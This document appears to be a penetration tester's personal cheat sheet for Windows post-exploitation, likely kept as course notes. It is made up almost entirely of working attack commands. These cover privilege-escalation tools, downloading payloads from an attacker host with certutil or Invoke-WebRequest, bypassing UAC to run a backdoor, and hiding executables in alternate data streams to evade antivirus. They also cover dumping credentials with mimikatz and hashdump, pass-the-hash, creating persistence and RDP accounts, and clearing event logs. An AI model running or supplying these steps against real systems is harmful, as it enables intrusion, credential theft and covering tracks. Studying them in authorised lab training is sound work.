# Tools
- **all tools can be installed using github or kali by apt**
``` shell
1) windows- exploit-suggester 
	# copy result of systeminfo > save result > run tool 
	# [script by AonCyberLabs]
	https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py

2) windows-kernel-exploits 
	# script by SecWiki
	https://github.com/SecWiki/windows-kernel-exploits

3) post/multi/recon/local_exploit_suggester
	# metasploit post module 
	
4) winpeas
	# tool pre-installed in linux for privesc

5) windows-privesc-check 
	# windows privesc check tool pre-installed in linux

6) PrivescCheck
	# another script
	https://github.com/itm4n/PrivescCheck

7) JAWS
	# another script
	https://github.com/411Hall/JAWS
```

---
# some post modules

``` shell 
## msfconsole post modules
- search migrate type:post platform: windows  # mirgate process
	>> manage/migrate
	
- search privs type:post platform:windows     # privesc enum
	>> gather/win_privs
	>> manage/persistence_exe 

- search /windows/gather/enum type:post platform:windows  # enumeration

- post/windows/gather/enum_logged_on_users
- post/windows/gather/checkvm  # virtual enviornment enum

- search enum_applications
- search type:post platform:windows enum_av 

- enum_commputers , enum_patches OR systeminfo[cmd.exe] # copy patches hotfixes
	>> enum_shares
```

---

# file transfer in windows

```powershell

1) "using curl"
    > curl.exe 'http://ip:port/file >> newfile'

2) "using wget"
    > wget.exe 'http://ip:port/file >> newfile'

3) "using certutil"
    > certutil -urlcache -f "http://ip:port/file" newfile
    
4) "using Invoke-WebRequest" 
	> Invoke-WebRequest http://attacker/file -OutFile C:\Temp\file

5) "using scp if ssh server is running"
	## from server to attacker machine (copy file to local machine)
	# scp server@ip:path localfilepath
	> scp alice@target.ine.local:/Users/alice/hashdump.txt hashdumps.txt

	# from local machine to target
	# scp localfile server@ip:path
	> scp PrintSpoofer64.exe david@target.ine.local:/temp/

$$ Note:tools like curl, wget, scp also works in linux with same
		syntext.
		
```

# Bypassing UAC (USER ACCOUNT CONTROL)

``` shell
1) "getsystem" # meterpreter command

2) "search bypassuac"  # metasploit post modules

3) "pgrep lsass.exe > migrate 788" # migrate current process into lsass.exe / explored.exe for higher privilege

4) "UACMe : opensource tool"
	`- "UACme github" -> compile exploit and execute`
	 - Akagi.exe 23 C:\Temp\backdoor.exe
	 - akagi32.exe [Key] [Param] 
	 - akagi64.exe [Key] [Param]
	 -> `then go for administrator access
	      : migrate -N lsass.exe ; hashdump`

5) "Windows Access tokens impersonation"
	# inside meterpreter module
	# migrate to higher privilege (lsass.exe,explorer.exe,etc...)
	- load incognito
		-> list_tokens -u / -g 
		-> impersonate_token "service account"

6) "Alternate data streams (ADS)"
	# used for evade basic signature based AVs 
	- notepad test.txt:secret.txt
	- cd Temp > type payload.exe > logs.txt:winpeas.exe
	# how to execute hidden progeram 
	- cd \ 
	- cd Windows\system32 
	- mklink wupdate.exe C:\Temp\logs.txt:winpeas.exe
	- execute program > `wupdate`

```

---
# Windows Credential Dumping
``` shell
1) "using meterpreter"
	- hashdump  # dump ntlm hashes
	
	# mimikatz meterpreter extension
	- load kiwi
		-> creds_all     # will dump all creds
		-> lsa_dump_sam  # will dump lsa and sam hashes 
		-> lsa_dump_secrets # dump secrets
		
	# by uploading mimikatz executable to victim
	- mkdir C:\\TEMP
	- cd C:\\TEMP
	- upload '/usr/share/windows-resources/mimikatz/x64/mimikatz.exe'  
	- shell # get a shell 
		-> .\mimikatz.exe  
		-> privilege::debug   # response should be (privilege '20' ok )  
		-> token::elevate     # elevate privilege
		-> lsadump::sam       # sam hashes and lsadump::secrets > for hidden info if require  
		-> sekurlsa::logonpasswords  # for clear text passwords
		-> lsadump::secrets   # clear text passwords

2) "by searching config files"
	# find configuration files like 
	- C:\Windows\Panther\unattend.xml 
	- C:\Windows\Panther\Autounattend.xml

3) "using powersploit scripts"
	# path : '/usr/share/windows-resources/powersploit/'
	# upload any script or whole dir as module | read README.md for usage
	- '/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1' # script for enumeration
	- powershell -ep bypass . .\PowerUp.ps1
	- Invoke-PrivescAudit or <respective command> # check README.md

4) "by using utilites like runas.exe"
	- cmdkey /list  # list saved credentials
	- runas /savecred /user:admin cmd.exe # use this cmd if you show any creds in cmdkey
	- runas.exe /user:administrator cmd.exe  # much like sudo or su but ie require password so if you know that use this cmd

5) "by pass-the-hash"
	# authantic via ntlm hash or by found credential
	# use tools that support ntlm auth or tools that support creds
	1) "tools that supports ntlm hashes"
		- evil-winrm  impacket-psexec impacket-wmiexec
		- crackmapexec  netexec
	2) "tools that supports credentials"
		- same as 1) but some metasploit-modules only supports creds


```

---
# Establishing Persistence On Windows

``` shell
1) "by using metasploit modules"
	- search platform:windows type:post Persistence  # search for post modules 
	- search platform:windows type:exploit Persistence  # search for exploits

	# some wellknown modules 
	- post/windows/manage/sshkey_persistence
	- post/windows/manage/persistence_exe
	- exploit/windows/local/registry_persistence
	- exploit/windows/local/persistence_service # most used

# via rdp service
-> run getgui -e -u testrdp -p hacked@123 # meterpreter command
# if  meterpreter command not work use enable_rdp module manually 
->  post/windows/manage/enable_rdp  

```

---
# Clearing Windows Event  logs
``` shell
# You can see all your logs in Event viewer application
- clearev # meterpreter command for wiping logs

```

---
